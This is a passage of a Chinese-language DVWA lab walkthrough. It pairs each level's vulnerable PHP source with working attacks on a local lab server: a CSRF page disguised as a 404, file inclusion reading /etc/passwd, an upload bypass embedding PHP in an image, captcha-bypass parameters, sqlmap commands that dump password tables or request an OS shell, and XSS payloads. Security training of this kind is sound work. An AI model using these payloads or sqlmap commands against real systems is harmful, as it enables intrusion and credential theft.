mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update database with new password $data = $db-&gt;prepare( &#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27; ); $data-&gt;bindParam( &#x27;:password&#x27;, $pass_new, PDO::PARAM_STR ); $data-&gt;bindParam( &#x27;:user&#x27;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;execute(); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;# High CSRF Source&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;# Medium CSRF Source&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Checks to see where the request came from if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123; // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Didn&#x27;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt;# Low CSRF Source&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; # Low 做个网页 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;是兄弟就来砍我&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;center&gt; &lt;form action=&quot;http://192.168.23.133/dvwa/vulnerabilities/csrf/&quot; method=&quot;get&quot;&gt; &lt;p&gt;&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;123&quot;/&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;123&quot;/&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;/&gt;&lt;/p&gt; &lt;input type=&quot;submit&quot; value=&quot;是兄弟就来砍我&quot;&gt; &lt;/form&gt; &lt;p style=&quot;font-size:40px;&quot;&gt;404&lt;/p&gt; &lt;p style=&quot;font-size:20px;&quot;&gt;Page not Found!&lt;/p&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 包信息 12345678910GET /dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change HTTP/1.1Host: 192.168.23.133User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeReferer: http://192.168.23.133/dvwa/vulnerabilities/csrf/Cookie: security=medium; PHPSESSID=otpvh75rdm983qnfc0scstgns0Upgrade-Insecure-Requests: 1 # Medium Low 方法失效，对比正常请求的包，发现包中添加了 1Referer: http://192.168.23.133/dvwa/vulnerabilities/csrf/ 解决方案是将 csrf 网页部署在目标服务器 IP 作为的路径下。 # High 需要配合 XSS 攻击 # File Inclusion 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253//File Inclusion//Impossible File Inclusion Source&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Only allow include.php or file&#123;1..3&#125;.phpif( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125;?&gt;//High File Inclusion Source&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125;?&gt;//Medium File Inclusion Source&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file );?&gt;//Low File Inclusion Source&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];?&gt; # Low GET 方法传参，直接修改网址，查看 /etc/passwd 123?page=/etc/passwdroot:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin polkitd:x:999:998:User for polkitd:/:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin chrony:x:998:996::/var/lib/chrony:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin dockerroot:x:997:994:Docker User:/var/lib/docker:/sbin/nologin # Medium 过滤了 “http://”, “https://”，“…/&quot;,&quot;…\\&quot; 可以构造 &quot;httphttp://😕/&quot; 异形路径 同 Low 等级 # High 加入黑名单机制，参数只能以 file 开头 构造参数 1?page=file:///etc/passwd 使用 file 协议访问本地文件 # File Upload 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159//File Upload//Impossible File Upload Source&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ]; $uploaded_tmp = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &#x27;hackable/uploads/&#x27;; //$target_file = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;; $target_file = md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext; $temp_file = ( ( ini_get( &#x27;upload_tmp_dir&#x27; ) == &#x27;&#x27; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#x27;upload_tmp_dir&#x27; ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == &#x27;jpg&#x27; || strtolower( $uploaded_ext ) == &#x27;jpeg&#x27; || strtolower( $uploaded_ext ) == &#x27;png&#x27; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &#x27;image/jpeg&#x27; || $uploaded_type == &#x27;image/png&#x27; ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == &#x27;image/jpeg&#x27; ) &#123; $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); &#125; else &#123; $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); &#125; imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; // Yes! echo &quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; else &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;//High File Upload Source&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; $uploaded_tmp = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt;//Medium File Upload Source&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ]; $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt;//Low File Upload Source&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125;&#125;?&gt; # Low 随便上传，无限制 # Medium 限制文件类型，但是可以改包上传 Content-Type: image/png 1234567891011121314151617181920212223242526272829303132333435363738394041POST /dvwa/vulnerabilities/upload/ HTTP/1.1Host: 192.168.23.133User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------24238774263872546046514723521Content-Length: 977Origin: http://192.168.23.133Connection: closeReferer: http://192.168.23.133/dvwa/vulnerabilities/upload/Cookie: security=low; PHPSESSID=otpvh75rdm983qnfc0scstgns0Upgrade-Insecure-Requests: 1-----------------------------24238774263872546046514723521Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;100000-----------------------------24238774263872546046514723521Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;a.txt&quot;Content-Type: image/png txt 上传成功 1../../hackable/uploads/a.txt succesfully uploaded! # High 加入内容检测和文件类型检测 通过在图片中加入一句话木马实现上传 1echo &quot;&lt;? phpinfo() ?&gt;&quot; &gt;&gt;th.jpeg 1../../hackable/uploads/th.jpeg succesfully uploaded! 通过文件包含漏洞解析上传图片 1?page=file:///var/www/html/dvwa//hackable/uploads/th.jpeg # Insecure CAPTCHA # Low 修改包的参数 step=2 即可。 123step=2&amp;password_new=123&amp;password_conf=123&amp;Change=ChangePassword Changed. # Medium 修改包的参数 step=2。 查看源码得知新变量 passed_captcha，谷歌返回情况，将其 POST 为 true。 1step=2&amp;password_new=123&amp;password_conf=123&amp;Change=Change&amp;passed_captcha=true # High 添加如下信息至包中 123User-Agent: reCAPTCHAstep=1&amp;password_new=123&amp;password_conf=123&amp;user_token=2143b157158c8dce48d7b94d045bad71&amp;Change=Change&amp;g-recaptcha-response=hidd3n_valu3 # SQL Injection 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122//SQL Injection//Impossible SQL Injection Source&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $id = $_GET[ &#x27;id&#x27; ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; ); $data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ &#x27;first_name&#x27; ]; $last = $row[ &#x27;last_name&#x27; ]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;//High SQL Injection Source&lt;?phpif( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_SESSION[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125;?&gt;//Medium SQL Injection Source&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_POST[ &#x27;id&#x27; ]; $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#x27;&lt;pre&gt;&#x27; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Display values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125;&#125;// This is used later on in the index.php page// Setting it here so we can close the database connection in here like in the rest of the source scripts$query = &quot;SELECT COUNT(*) FROM users;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );$number_of_rows = mysqli_fetch_row( $result )[0];mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);?&gt;//Low SQL Injection Source&lt;?phpif( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_REQUEST[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt; # Low 特点：GET 1 1’//wrong 1’ or 1=1– 1’ union select 1,database()– sqlmap 1sqlmap -u &quot;http://0.0.0.0/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --dump # Medium 特点：POST 手工注入 id=1 union select 1,table_name from information_schema=dvwa– HEX 加密关键字 id=1 union select 1,table_name from information_schema=0x64767761– sqlmap --data 参数 123456#脱裤sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/#&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=medium; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --dump --batch#上马lmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/#&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=medium; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --os-shell#需要加绝对路径，可以利用phpinfo() # High 特点：返回到不同页面 手动无差别 sqlmap --second-url 参数 1sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/session-input.php&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=high; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; --second-url &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/&quot;-D dvwa -T users -C user,password --dump --batch # SQL Injection (Blind) # Low 手注过于麻烦不演示 sqlmap 12sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=f48dupm9bkmo862t404a2hmvl1&quot; -D dvwa -T users -C user,password --dump --batch # Medium 12sqlmap -u&quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/#&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=o5v0fkp2cld3nef9aninvap224&quot; -D dvwa -T users -C user,password --dump --batch # High 1sqlmap -u &quot;192.168.23.133/dvwa/vulnerabilities/sqli_blind/cookie-input.php&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;id=1; security=high; PHPSESSID=o5v0fkp2cld3nef9aninvap224&quot; --second-url &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/&quot; -D dvwa -T users -C user,password --dump --batch # Weak Session IDs # Low # Medium # High # DOM Based Cross Site Scripting (XSS) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//DOM Based Cross Site Scripting (XSS) Vulnerability//Impossible Unknown Vulnerability Source&lt;?php# Don&#x27;t need to do anything, protction handled on the client side?&gt;//High Unknown Vulnerability Source&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123; # White list the allowable languages switch ($_GET[&#x27;default&#x27;]) &#123; case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; &#125;&#125;?&gt;//Medium Unknown Vulnerability Source&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123; $default = $_GET[&#x27;default&#x27;]; # Do not allow script tags if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123; header (&quot;location: ?default=English&quot;); exit; &#125;&#125;?&gt;//Low Unknown Vulnerability Source&lt;?php# No protections, anything goes?&gt; # Low 1&lt;script&gt;alert(/xss/)&lt;/script&gt; # Medium 1&lt;/option&gt;&lt;/select&gt;&lt;option&gt;&lt;select&gt;&lt;img%20src=&quot;x&quot;%20onerror=&quot;alert(1)&quot;/&gt; # High 12English#&lt;script&gt;alert(/xss/);&lt;/script&gt;#之后的被过滤，不传到服务端 # Reflected Cross Site Scripting (XSS) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667//Reflected XSS//Impossible Reflected XSS Source&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $name = htmlspecialchars( $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;//High Reflected XSS Source&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt;//Medium Reflected XSS Source&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; 